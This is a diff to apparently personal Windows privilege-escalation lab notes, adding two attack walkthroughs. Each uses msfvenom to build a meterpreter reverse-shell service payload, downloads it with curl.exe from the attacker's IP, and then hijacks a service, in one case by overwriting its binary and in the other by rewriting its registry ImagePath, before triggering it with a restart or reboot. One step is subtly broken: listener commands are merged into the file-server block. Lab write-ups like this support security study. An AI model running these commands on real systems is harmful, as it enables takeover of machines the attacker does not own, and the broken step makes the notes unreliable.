@@ -293,11 +293,65 @@ winPEAS was unable to locate this vuln in the scan I did. However, I manually se
 
 Task 4
 
-WeakSvc Exploit
+WeakSvc Exploit:
+#### On Kali - generate payload
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.199.129 LPORT=1341 -f exe-service > weak.exe
+```
+#### On Kali - start file server
+```python3 -m http.server 8000```
+
+#### On Kali - start listener
+```
+msfconsole -q
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.199.129
+set LPORT 1341
+exploit -j
+```
+#### On Windows - download and overwrite the vulnerable service binary
+```curl.exe http://192.168.199.129:8000/weak.exe -o "C:\Program Files\Weak Service\weakservice.exe"```
+
+#### Trigger the service
+```
+sc stop WeakSvc
+sc start WeakSvc
+```
 https://youtu.be/L6jsYKpi2os
 
-Weak Registry Permissions - RegSvc Exploit
+Weak Registry Permissions - RegSvc Exploit:
+
+#### On Kali - generate payload
+
+```msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.199.129 LPORT=1342 -f exe-service > reg.exe```
+
+#### On Kali - start file server
+```
+python3 -m http.server 8000
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.199.129
+set LPORT 1342
+exploit -j
+```
+#### On Windows - download payload
+
+```curl.exe http://192.168.199.129:8000/reg.exe -o C:\Users\azrael\reg.exe```
+
+#### Overwrite the service's ImagePath
+
+```reg add "HKLM\SYSTEM\CurrentControlSet\Services\RegSvc" /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\azrael\reg.exe" /f```
+
+sc start failed with Access Denied (no start permission granted)
+
+Workaround: flip service to auto-start instead
+```reg add "HKLM\SYSTEM\CurrentControlSet\Services\RegSvc" /v Start /t REG_DWORD /d 2 /f```
+
+Trigger with reboot
+```shutdown /r /t 0```
 https://youtu.be/tZ9cMBuDX4s
+
 
 
 
